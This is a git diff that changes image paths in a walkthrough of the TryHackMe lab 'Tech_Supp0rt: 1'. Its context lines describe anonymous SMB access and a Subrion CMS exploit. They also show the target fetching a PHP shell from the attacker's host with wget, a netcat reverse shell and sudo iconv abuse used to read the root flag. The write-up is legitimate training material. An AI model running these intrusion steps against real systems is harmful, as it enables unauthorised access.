@@ -6,7 +6,7 @@
 As always, I'll walk you through my process, the tools I used, and yeah... the moments where I probably overthought things. Hope this helps someone out there!
 
 <p align="center">
-  <img src="../../assets/rooms/Tech_Supp0rt:1/0.png" alt="COVER" width="400"/>
+  <img src="../../assets/rooms/Tech_Supp0rt_1/0.png" alt="COVER" width="400"/>
   
                                                                                  
 ## Initial Reconnaissance
@@ -15,7 +15,7 @@ Alright, let's start the machine! Since we're not given any information, basic r
 
 First stop: visiting the website. We're greeted with a basic Apache page. Nothing too exciting yet.
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/1.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/1.png)
 
 ### Nmap Scan
 
@@ -60,7 +60,7 @@ Interesting findings! Let's check them out.
 
 Accessing `/test` shows us a super weird page.
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/2.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/2.png)
 
 Yeah, this is **NOT MICROSOFT**. Moving on...
 
@@ -68,7 +68,7 @@ Yeah, this is **NOT MICROSOFT**. Moving on...
 
 Found a WordPress site! Looks like it's still in development and appears to be some kind of tech support scam site. Typical.
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/3.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/3.png)
 
 Okay, we're not finding much here for now. Let's pivot to SMB.
 
@@ -94,7 +94,7 @@ Everything's locked down except for **websvr**. Let's access it and grab what's 
 smbclient //10.10.93.53/websvr -N
 ```
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/4.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/4.png)
 
 **IT'S A SCAM, I TOLD YOU!** 
 
@@ -112,11 +112,11 @@ Interesting! As we scroll through the files from the SMB share, we find **Subrio
 
 The Subrion documentation says the login panel is at `/subrion/panel/`. Let's try that!
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/5.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/5.png)
 
 **Bingo!** The login page exists. Let's try those credentials.
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/7.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/7.png)
 
 Wait... the credentials are encrypted!
 
@@ -130,17 +130,17 @@ Wait... the credentials are encrypted!
 
 After some analysis, I figured out the credentials are encoded in **Base58**! Who even uses Base58?! Let's throw it into CyberChef.
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/8.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/8.png)
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/9.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/9.png)
 
 Okay... now it's **Base32**!
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/10.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/10.png)
 
 And finally... **Base64**!
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/11.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/11.png)
 
 Alright, let's grab the flag— I mean, the credentials. This was incredibly... incredible.
 
@@ -155,7 +155,7 @@ Alright, let's grab the flag— I mean, the credentials. This was incredibly... 
 New panel unlocked! Where can we pop a shell on this thing?
 
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/12.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/12.png)
 
 After exploring the site, I noticed the version is written **all over the place**. Let's see if there's a CVE for this.
 
@@ -204,7 +204,7 @@ Let's run the exploit:
 python3 exploit.py -u http://10.10.133.14/subrion/panel/ -l admin -p password
 ```
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/13.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/13.png)
 
 **We're `www-data`!** As usual. But web shells are pretty annoying to work with, so let's get a proper reverse shell.
 
@@ -218,7 +218,7 @@ On the target server, download our shell:
 wget http://10.23.200.110:8000/shell.php
 ```
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/14.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/14.png)
 
 Set up a netcat listener:
 ```bash
@@ -227,7 +227,7 @@ ncat -lvnp 1337
 
 Now, if we access the uploads folder on the server, we can find our uploaded shell.
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/15.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/15.png)
 
 After trying to execute `shell.php` for a while, I remembered how the exploit worked. It abused `.phar` files! So...yeah, let's change our shell from `.php` to `.phar`
 
@@ -240,14 +240,14 @@ http://10.10.133.14/subrion/uploads/shell.phar
 
 **Reverse shell acquired!**
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/16.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/16.png)
 
 Stabilize it with:
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/17.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/17.png)
 
 ---
 
@@ -255,7 +255,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 We have a user called `scamsite`. Let's see if we can access their account somehow.
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/18.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/18.png)
 
 After resisting the temptation to run LinPEAS for a bit, I thought about checking if the WordPress site had any accessible credentials in it's folder. The `wp-admin` was password-protected, so I decided to:
 
@@ -265,28 +265,28 @@ grep "password" *
 
 in the WordPress directory.
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/19.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/19.png)
 
 **Found it!** In `wp-config.php` there's a MySQL password!
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/20.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/20.png)
 
 But wait... this IP doesn't have MySQL port open. Weird, but let's check the file anyway.
 
 **LOL, I WONDER WHERE I CAN TEST THIS...**
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/21.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/21.png)
 
 Yeah, uhh... it wasn't for `wp-admin`... Let me try it with the `scamsite` user since that seems to be the only valid option.
 ```bash
 su scamsite
 ```
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/22.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/22.png)
 
 **It was simpler than I thought!** Let's see if we have root now... not yet.
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/23.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/23.png)
 
 ---
 
@@ -297,13 +297,13 @@ Let's check our sudo privileges:
 sudo -l
 ```
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/24.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/24.png)
 
 We can run `iconv` as sudo! Time to check GTFOBins.
 
 The menu is extensive! TryHackMe says the flag is `root.txt`, so that's what we need to read.
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/26.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/26.png)
 
 ```bash
 iconv -f 8859_1 -t 8859_1 "root/root.txt"
@@ -314,7 +314,7 @@ Ah, and don't forget the **fucking sudo** or it will not work:
 sudo iconv -f 8859_1 -t 8859_1 "root/root.txt"
 ```
 
-![IMAGE](../../assets/rooms/Tech_Supp0rt:1/27.png)
+![IMAGE](../../assets/rooms/Tech_Supp0rt_1/27.png)
 
 **Question:** What is the root.txt flag?
 
